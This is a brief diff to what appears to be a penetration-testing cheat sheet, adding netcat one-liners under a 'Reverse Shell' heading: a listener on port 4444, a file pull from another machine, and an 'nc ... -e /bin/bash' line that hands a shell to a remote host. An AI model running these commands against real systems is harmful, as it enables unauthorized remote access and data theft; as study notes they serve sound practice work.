@@ -39,3 +39,7 @@
 
 ## Reverse Shell
 - `python3 -c 'import pty; pty.spawn("/bin/bash")'` : Upgrade a reverse shell to a fully interactive shell.
+- `nc -lvnp 4444`: Open port 4444
+- `nc <ip> 4444 > file.txt`: Retrieve a file from an open port on other machine 
+- `nc <ton_ip> 4444 -e /bin/bash`: Connect to the reverse shell with nc
+
